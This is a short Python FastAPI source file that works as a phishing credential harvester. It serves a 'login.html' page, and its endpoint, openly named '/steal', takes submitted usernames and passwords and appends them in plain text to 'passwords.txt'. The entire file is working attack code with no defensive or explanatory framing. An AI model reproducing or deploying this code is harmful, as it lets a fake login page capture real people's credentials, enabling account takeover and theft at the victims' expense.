from fastapi import FastAPI, Request
from fastapi.responses import FileResponse
import json

app = FastAPI()

@app.get("/")
async def index():
    return FileResponse("login.html")

@app.post("/steal")
async def steal(request: Request):
    data = await request.json()

    username = data.get("username", "")
    password = data.get("password", "")

    with open("passwords.txt", "a", encoding="utf-8") as f:
        f.write(f"username={username}, password={password}\n")

    return {"status": "ok"}